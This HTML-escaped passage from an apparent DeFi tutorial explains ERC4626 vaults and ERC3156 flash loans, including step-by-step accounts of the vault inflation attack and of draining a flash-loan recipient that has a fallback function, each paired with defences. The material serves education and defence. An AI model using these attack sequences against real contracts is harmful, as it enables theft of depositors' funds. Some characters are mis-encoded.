The inverse of &lt;strong&gt;deposit&lt;&#x2F;strong&gt; and &lt;strong&gt;mint&lt;&#x2F;strong&gt; is &lt;strong&gt;withdraw&lt;&#x2F;strong&gt; and &lt;strong&gt;redeem&lt;&#x2F;strong&gt; respectively.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;withdraw&lt;&#x2F;strong&gt; lets you specify how many &lt;strong&gt;assets&lt;&#x2F;strong&gt; you want to take from the contract, and the contract calculates how many of your shares to burn.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;function withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;redeem&lt;&#x2F;strong&gt;, you specify how many shares you want to &lt;strong&gt;burn&lt;&#x2F;strong&gt;, and the contract calculates the amount of assets to give back.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;function redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Anticipating how many shares you will burn to get assets back&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The view methods for withdraw and redeem are &lt;strong&gt;previewRedeem&lt;&#x2F;strong&gt; and &lt;strong&gt;previewWithdraw&lt;&#x2F;strong&gt; respectively.&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;strong&gt;idealized&lt;&#x2F;strong&gt; analog of these functions is &lt;strong&gt;convertToAssets&lt;&#x2F;strong&gt; which takes shares as an argument and gives you how many assets you will get back, not including fees and slippage.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Summary of functions :&lt;&#x2F;strong&gt;*&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_3.png&quot;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_4.png&quot;&gt;
&lt;p&gt;The functions mint, deposit, redeem, and withdraw, have an second argument ‚Äúreceiver‚Äù for cases where the account receiving shares or assets from the ERC4626 is not msg.sender. This means I can deposit assets into the account and specify that the ERC4626 contract give you the shares.&lt;&#x2F;p&gt;
&lt;p&gt;Redeem and withdraw have a third argument, ‚Äúowner‚Äù which allows msg.sender to burn the shares of the ‚Äúowner‚Äù while sending assets to the ‚Äúreceiver‚Äù (second argument) if they have allowance to do so.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;maxDeposit, maxMint, maxWithdraw, maxRedeem&lt;&#x2F;strong&gt;
These functions take identical arguments to their state-changing counterparts and return the largest trade they can execute. This can change per address (remember, we just discussed that these functions take addresses as arguments).&lt;&#x2F;p&gt;
&lt;h3 id=&quot;events&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#events&quot; aria-label=&quot;Anchor link for: events&quot;&gt;Events&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;ERC4626 has only two events in addition to the &lt;strong&gt;ERC20 events&lt;&#x2F;strong&gt; it inherits: &lt;strong&gt;Deposit&lt;&#x2F;strong&gt; and &lt;strong&gt;Withdraw&lt;&#x2F;strong&gt;. These are also emitted if mint and redeem were called, because functionally the same thing happened: tokens were swapped.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;event Deposit(
&lt;&#x2F;span&gt;&lt;span&gt;    address indexed sender,
&lt;&#x2F;span&gt;&lt;span&gt;    address indexed owner,
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 assets,
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 shares
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;event Withdraw(
&lt;&#x2F;span&gt;&lt;span&gt;    address indexed sender,
&lt;&#x2F;span&gt;&lt;span&gt;    address indexed receiver,
&lt;&#x2F;span&gt;&lt;span&gt;    address indexed owner,
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 assets,
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 share
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;slippage&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#slippage&quot; aria-label=&quot;Anchor link for: slippage&quot;&gt;Slippage&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Any token swapping protocol has an issue where the user might not get back the amount of tokens they were expecting.&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;For example, with automated market makers, a large trade might use up the liquidity and cause the price to move substantially.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Another issue is a transaction getting frontrun or experiencing a sandwich attack. In the examples above, we&#x27;ve assumed the ERC4626 contract maintains a one-to-one relationship between asset and shares regardless of the supply, but the ERC4626 standard does not dictate how the pricing algorithm should work.&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;For example, suppose we make the amount of shares issued a function of the square root of the assets deposited. In that case, whoever deposits first will get a larger amount of shares. This could encourage opportunistic traders to frontrun deposit orders and force the next buyer to pay a larger amount of the asset for the same amount of shares.&lt;&#x2F;p&gt;
&lt;p&gt;The defense against this is simple: the contract interacting with an ERC4626 should measure the amount of shares it received during a deposit (and assets during a withdraw) and revert if it does not receive the quantity expected within a certain slippage tolerance.&lt;&#x2F;p&gt;
&lt;p&gt;This is a standard design pattern to deal with slippage issues. It will also defend against the issue described below.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;erc4626-inflation-attack&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#erc4626-inflation-attack&quot; aria-label=&quot;Anchor link for: erc4626-inflation-attack&quot;&gt;&lt;strong&gt;ERC4626 inflation attack&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Although ERC4626 is agnostic to the algorithm that translates prices to shares, most implementations use a linear relationship. If there are 10,000 assets, and 100 shares, then 100 assets should result in 1 share.&lt;&#x2F;p&gt;
&lt;p&gt;But what happens if someone sends 99 assets? It will round down to zero and they get zero shares.&lt;&#x2F;p&gt;
&lt;p&gt;Of course no-one would intentionally throw away their money like this. However, an attacker can frontrun a trade by donating assets to the vault.&lt;&#x2F;p&gt;
&lt;p&gt;If an attacker donates money to the vault, one share is suddenly worth more than it was initially. If there are 10,000 assets in the vault corresponding to 100 shares, and the attacker donates 20,000 assets, then one share is suddenly worth 300 assets instead of 100 assets. When the victim‚Äôs trade trades in assets to get back shares, they suddenly get a lot fewer shares ‚Äî possibly zero.&lt;&#x2F;p&gt;
&lt;p&gt;There are three &lt;strong&gt;defenses&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Revert if the amount received is not within a slippage tolerance (described earlier)&lt;&#x2F;li&gt;
&lt;li&gt;The deployer should deposit enough assets into the pool such that doing this inflation attack would be too expensive&lt;&#x2F;li&gt;
&lt;li&gt;Add &quot;virtual liquidity&quot; to the vault so the pricing behaves as if the pool had been deployed with enough assets.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Here is OpenZeppelin&#x27;s implementation of &lt;strong&gt;virtual liquidity&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_5.png&quot;&gt;
&lt;p&gt;When calculating the amount of shares a depositor receives, the total supply is artificially inflated (at a rate the programmer specifies in _decimalsOffset()).&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s walk through an example. By way of reminder, here is what the variables above mean:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;totalSupply() = total number of shares issued&lt;&#x2F;li&gt;
&lt;li&gt;totalAssets() = the balance of assets held by the ERC4626&lt;&#x2F;li&gt;
&lt;li&gt;assets = the amount of assets the user is depositing&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The formula is&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;shares_received = assets_deposited * totalSupply() &#x2F; totalAssets();&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There is some implementation details for rounding in favor of the pool and adding 1 to totalAssets() to ensure we don&#x27;t divide by zero if the pool is empty.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s say we have the following numbers:&lt;&#x2F;p&gt;
&lt;p&gt;assets_deposited = 1,000&lt;&#x2F;p&gt;
&lt;p&gt;totalSupply() = 1,000&lt;&#x2F;p&gt;
&lt;p&gt;totalAssets() = 999,999 (the formula adds 1, so we will set it this way to make the number nice)&lt;&#x2F;p&gt;
&lt;p&gt;In that case, the shares the user will get is 1,000 x 1,000 √∑ 1,000,000, or exactly 1.&lt;&#x2F;p&gt;
&lt;p&gt;This is obviously very fragile. If the attacker frontruns the deposit of 1,000 shares and  deposits assets, then the victim will get zero back, because 1 million divided by a number larger than 1 million is zero in integer division.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;How does virtual liquidity solve this?&lt;&#x2F;strong&gt; Using the code from the screenshot above, we would set _decimalOffset() to be 3, so that way totalSupply() gets 1,000 added to it.&lt;&#x2F;p&gt;
&lt;p&gt;Effectively, we are making the numerator 1,000 times larger. This forces the attacker to make a donation 1,000 times as large, which disincentivizes them from conducting the attack.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Example of inflation attack&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;When a depositor wants to be the initial depositor, sends 10 USDC to the vault.&lt;&#x2F;li&gt;
&lt;li&gt;Attacker see‚Äôs that tx and front runs with calling deposit with 1 USDC. So, now the attacker becomes the initial depositor and totalSupply becomes 1. Attacker receives 1 share.&lt;&#x2F;li&gt;
&lt;li&gt;And now attacker donates equal amount of USDC that user transfer to the vault without calling the deposit function. So, the totalSupply won‚Äôt be updated. totalSupply still 1. And the totalBalance becomes 10 USDC.&lt;&#x2F;li&gt;
&lt;li&gt;Now the else block of the deposit executes and number of shares that mints to the user becomes 0.&lt;&#x2F;li&gt;
&lt;li&gt;So, the shares are that minted are only to attacker. So attacker owns the whole ownership on vault. Attacker can withdraw all the balance in the vault now.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_6.png&quot;&gt;
&lt;h3 id=&quot;example-implementation-of-share-asset-calculation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#example-implementation-of-share-asset-calculation&quot; aria-label=&quot;Anchor link for: example-implementation-of-share-asset-calculation&quot;&gt;Example Implementation of share&#x2F;asset calculation&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_7.png&quot;&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter1_8.png&quot;&gt;
&lt;p&gt;&lt;strong&gt;Real life examples of share &#x2F; asset accounting&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Earlier versions of &lt;strong&gt;Compound&lt;&#x2F;strong&gt; minted what they called &lt;strong&gt;c-tokens&lt;&#x2F;strong&gt; to users who supplied liquidity. For example, if you deposited USDC, you would get a separate cUSDC (Compound USDC) back. When you decided to stop lending, you would send back your cUSDC to compound (where it would be burned) then get your pro-rata share of the USDC lending pool.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Uniswap&lt;&#x2F;strong&gt; used &lt;strong&gt;LP tokens&lt;&#x2F;strong&gt; as ‚Äúshares‚Äù to represent how much liquidity someone had put into a pool, (and how much they could withdraw pro-rata) when they redeemed the LP tokens for the underlying asset.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-2-erc3156-flash-loans&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-2-erc3156-flash-loans&quot; aria-label=&quot;Anchor link for: chapter-2-erc3156-flash-loans&quot;&gt;&lt;strong&gt;Chapter-2 : ERC3156 Flash Loans&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Flash Loans and how to hack them: a walk through of ERC 3156&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Flash loans&lt;&#x2F;strong&gt; are loans between smart contracts that must be repaid in the same transaction.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;Simple Flash Loan :&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter2_1.webp&quot;&gt;
&lt;p&gt;If the borrower does not pay back the loan, therequire statement with the message ‚Äúflash not paid back‚Äù will cause the entire transaction to revert.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Only contracts can work with flash loans&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;No need of collateral to take flash loan&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;what-are-flashloans-used-for&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#what-are-flashloans-used-for&quot; aria-label=&quot;Anchor link for: what-are-flashloans-used-for&quot;&gt;&lt;strong&gt;What are flashloans used for?&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Arbitrage&lt;&#x2F;strong&gt; : The most common use case for a flash loan is to do an arbitrage trade.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Refinancing Loans&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;For regular DeFi loans, they typically require some kind of collateral. For example, if you were borrowing $10,000 in stable coins, you would need to deposit $15,000 of Ether as collateral.&lt;&#x2F;p&gt;
&lt;p&gt;If your stable coins loan had a 5% interest and you wanted to refinance with another lending smart contract at 4%, you would need to&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;pay back the $10,000 in stable coins&lt;&#x2F;li&gt;
&lt;li&gt;withdraw the $15,000 Ether collateral&lt;&#x2F;li&gt;
&lt;li&gt;deposit the $15,000 Ether collateral into the other protocol&lt;&#x2F;li&gt;
&lt;li&gt;borrow $10,000 in stable coins again at the lower rate&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;This would be problematic if you had the $10,000 tied up in some other application. With a flashloan, you can do steps 1-4 without using any of your own stable coins.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Exchanging collateral&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the example above, the borrower was using $15,000 of Ether as collateral. But suppose the protocol is offering a lower collateralization ratio using wBTC (wrapped bitcoin)? The borrower could use a flash loan and a similar set of steps outline above to swap out the collateral instead of the principal.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Liquidating Borrowers&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the context of DeFi loans, if the collateral falls below a certain threshold, then the collateral can get liquidated ‚Äî forcibly sold to cover the cost of the loan. In the example above, if the value of the Ether was to drop to $12,000, then the protocol might allow someone to purchase the Ether for $11,500 if they first pay back the $10,000 loan.&lt;&#x2F;p&gt;
&lt;p&gt;A liquidator could use a flash loan to pay off the $10,000 stable coin loan and receive $11,500. They would then sell this on another exchange for stable coins, and then pay back the flash loan.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Increase yield for other DeFi applications&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Uniswap and AAVE earn depositors‚Äô money through trading fees or lending interest. But since they have such a large amount of capital in one place, they can make additional money by also offering flash loans. This increases the efficiency of capital since the same capital now has more uses.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Hacking Smart Contracts&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Flash loans are probably most famous for their use by black hat hackers to exploit protocols. The primary attack vectors for flash loans are price manipulation and governance (vote) manipulation. Used on DeFi applications with inadequate defense, flash loans allow attackers to heavily buy up an asset increasing its price, or acquiring a bunch of voting tokens to push through a governance proposal.&lt;&#x2F;p&gt;
&lt;p&gt;The following is a list of flash loan hacks for the curious. Vulnerability is two-sided however. A flash lending and flash borrowing contract can also be vulnerable to losing money if not implemented properly.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;erc3156-protocol&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#erc3156-protocol&quot; aria-label=&quot;Anchor link for: erc3156-protocol&quot;&gt;&lt;strong&gt;ERC3156 Protocol&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;ERC3156 seeks to standardize the interface for getting flash loans.&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;erc3156-receiver-specification&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#erc3156-receiver-specification&quot; aria-label=&quot;Anchor link for: erc3156-receiver-specification&quot;&gt;&lt;strong&gt;ERC3156 Receiver Specification&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The first aspect of the standard is the interface the borrower needs to implement, which is shown below. The borrower only needs to implement one function.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter2_2.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;initiator&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is the address that initiated the flash loan. &lt;strong&gt;You probably want some kind of validation here so that untrusted addresses are not initiating flashloans on your contract.&lt;&#x2F;strong&gt; Usually, the address would be &lt;em&gt;&lt;strong&gt;you&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;, but you shouldn‚Äôt assume that!&lt;&#x2F;p&gt;
&lt;p&gt;The function onFlashLoan is &lt;strong&gt;expected&lt;&#x2F;strong&gt; to be called by the flash loan contract, not the initiator. &lt;strong&gt;You should check msg.sender is the flash loan contract inside the onFlashLoan() function because this function is external and anyone can call it.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Initiator is not msg.sender or the flash loan contract. It is the address that triggered the flash lending contract to call the receiver‚Äôs onFlashLoan function.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;token&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is the address of the ERC20 token you are borrowing. Contracts offering flash loans will usually hold several tokens they can flash loan out. The ERC3156 flash loan standard does not support flash loaning native Ether, but this can be implemented by flash loaning WETH and having the borrower unwrap the WETH. Because the borrowing contract is not necessarily the contract that called the flash loaner, the borrowing contract may need to be told what token is being flash lent.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;fee&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Fee is how much of the token needs to be paid as a fee for the loan. It is denominated in absolute amount, not percentages.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;data&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If your flash loan receiving contract isn‚Äôt hard coded to take a particular action when receiving a flash loan, you can parameterize its behavior with the data parameter. For example, if your contract is arbitraging trading pools, then you would specify which pools to trade with.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;return value&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The contract must return &lt;code&gt;keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Reference implementation of the borrower&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;If the flash lender were somehow compromised, the contract below could be exploited through feeding it bogus amount and fee and initiator data.&lt;&#x2F;strong&gt; If the lender is immutable, this isn‚Äôt a concern, but it could be an attack vector if the lender is upgradeable.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter2_3.webp&quot;&gt;
&lt;h3 id=&quot;erc3156-lender-specification&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#erc3156-lender-specification&quot; aria-label=&quot;Anchor link for: erc3156-lender-specification&quot;&gt;&lt;strong&gt;ERC3156 Lender Specification&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Below is the interface for the lender specified by ERC3156&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter2_4.webp&quot;&gt;
&lt;p&gt;The &lt;code&gt;flashLoan()&lt;&#x2F;code&gt; function needs to accomplish a few important operations:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Someone might call &lt;code&gt;flashLoan()&lt;&#x2F;code&gt; with a token the flash loan contract does not support. This should be checked for.&lt;&#x2F;li&gt;
&lt;li&gt;Someone might call &lt;code&gt;flashLoan()&lt;&#x2F;code&gt; with an amount that is larger than &lt;code&gt;maxFlashLoan&lt;&#x2F;code&gt;. This also should be checked for&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;data&lt;&#x2F;code&gt; is simply forwarded to the caller.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;More importantly, &lt;code&gt;flashLoan()&lt;&#x2F;code&gt; must transfer the tokens to the receiver &lt;em&gt;&lt;strong&gt;and&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt; transfer them back. It should not rely on the borrower transferring the tokens back for repayment.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Reference Implementation of Lender&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter2_5.webp&quot;&gt;
&lt;p&gt;Note that the reference implementation is assuming that the ERC20 tokens return true on success, which not all do, so use the SafeTransfer library if using non-compliant ERC20 tokens.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;security-considerations&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#security-considerations&quot; aria-label=&quot;Anchor link for: security-considerations&quot;&gt;&lt;strong&gt;Security Considerations&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Access control and input validation for borrower&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The borrowing smart contract must have the controls in place to only allow the flash lender contract to be the caller of &lt;code&gt;onFlashLoan()&lt;&#x2F;code&gt;. Otherwise, some actor other than the flash lender can call &lt;code&gt;onFlashLoan()&lt;&#x2F;code&gt; and cause unexpected behavior.&lt;&#x2F;p&gt;
&lt;p&gt;Furthermore, &lt;em&gt;&lt;strong&gt;anyone can call flashloan()&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt; with an arbitrary borrower as the target and pass arbitrary data. To ensure the data is not malicious, a flash loan receiver contract should only allow a restricted set of initiators.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Reentrance locks are very important&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;ERC 3156 by definition cannot follow the check effects pattern to prevent reentrancy. It has to notify the borrower it has received the tokens (make an external call), then transfer the tokens back. As such, &lt;code&gt;nonReentrant&lt;&#x2F;code&gt; locks should be added to the contract.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;It is important that the lender is the one transferring the tokens back or that reentrancy locks are in place.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the above implementations, the lender transfers the tokens back from the borrower. The borrower does not transfer the loans to the lender. This is important to avoid ‚Äú&lt;strong&gt;side entrances&lt;&#x2F;strong&gt;‚Äù where the borrower deposits money into the protocol as a lender. Now the pool sees it‚Äôs balance has returned to what it was before, but the borrower suddenly has become a lender with a large deposit.&lt;&#x2F;p&gt;
&lt;p&gt;UniswapV2‚Äôs flash loan does not transfer the tokens back after the flash loan finishes. However, it uses a reentrancy lock to ensure that the borrower cannot ‚Äúpay back the loan‚Äù by depositing it back into the protocol as if they were a lender.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;For the borrower, ensure only flash lender contract can call onFlashLoan&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The flash lender is hardcoded to only call the receiver‚Äôs &lt;code&gt;onFlashLoan()&lt;&#x2F;code&gt; function and nothing else. If a borrower had a way to specify which function the flash lender would call, then the flash loan could be manipulated into transferring other tokens in it‚Äôs possession (by calling ERC20.transfer) or granting approval to it‚Äôs token balance to a malicious address.&lt;&#x2F;p&gt;
&lt;p&gt;Because such actions require an explicit call to an ERC20 transfer or approve, this can‚Äôt happen if the flash lender can only call &lt;code&gt;onFlashLoan()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Using token.balanceOf(address(this)) can be manipulated&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In the implementation above, we do not use balanceOf(address(this)) except to determine the maximum flash loan size. This can be altered by someone else directly transferring tokens to the contract, interfering with the logic. The way we know the flash loan was paid back is because the lender transferred back the loan amount + fee. There are valid ways to use balanceOf(address(this)) to check repayment, but this must be combined with reentrancy checks to avoid paying back the loan as a deposit.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Why the flash borrower needs to return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This handles the situation where a contract (not the flash lender contract) with a fallback function has given approval to the flash lending contract. Someone could repeatedly initiate a flashloan with that contract as a recipient. Then the following would happen:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;The victim contract gets a flashloan&lt;&#x2F;li&gt;
&lt;li&gt;The victim contract gets called with &lt;code&gt;onFlashLoan()&lt;&#x2F;code&gt; and the fallback function is triggered but does not revert. The fallback function responds to any function call that doesn&#x27;t match the rest of the functions in the contract, so it will respond to a &lt;code&gt;onFlashLoan()&lt;&#x2F;code&gt; call.&lt;&#x2F;li&gt;
&lt;li&gt;The flash lender withdraws tokens from the borrower + fee&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;If this operation happens in a loop, the victim contract with the fallback will get drained. The same could happen with an EOA wallet, since calling a wallet address with &lt;code&gt;onFlashLoan&lt;&#x2F;code&gt; does not revert.&lt;&#x2F;p&gt;
&lt;p&gt;Checking that the  &lt;code&gt;onFlashLoan&lt;&#x2F;code&gt;  function does not revert isn‚Äôt good enough. The flash lender also checks that the value  &lt;code&gt;keccack256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;)&lt;&#x2F;code&gt; is returned so that it knows the borrower intended to borrow the tokens and also pay back the fee.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-3-uniswap-v2-architecture&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-3-uniswap-v2-architecture&quot; aria-label=&quot;Anchor link for: chapter-3-uniswap-v2-architecture&quot;&gt;&lt;strong&gt;Chapter-3 :Uniswap V2 Architecture&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;Uniswap V2 Architecture: An Introduction to Automated Market Makers&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
